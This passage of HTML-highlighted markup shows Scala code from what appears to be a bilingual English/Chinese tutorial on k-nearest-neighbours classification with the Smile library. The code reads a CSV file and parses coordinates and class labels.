&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-38&quot;&gt;38&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-1&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;KNNExample&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Unit&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/.../KNN_Example_1.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;source&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getLines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-15&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataPoints&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifierArray&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataPoints&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifierArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Split the comma separated value string into an array of strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//把用逗号分隔的数值字符串分解为一个字符串数组&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Extract the values from the strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//从字符串中抽取数值&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xCoordinate&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toDouble&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-30&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;yCoordinate&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toDouble&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-31&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifier&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toInt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//And return the result in a format that can later &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-34&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//easily be used to feed to Smile&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//并以一定格式返回结果，使得该结果之后容易输入到Smile中处理&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-36&quot;&gt;
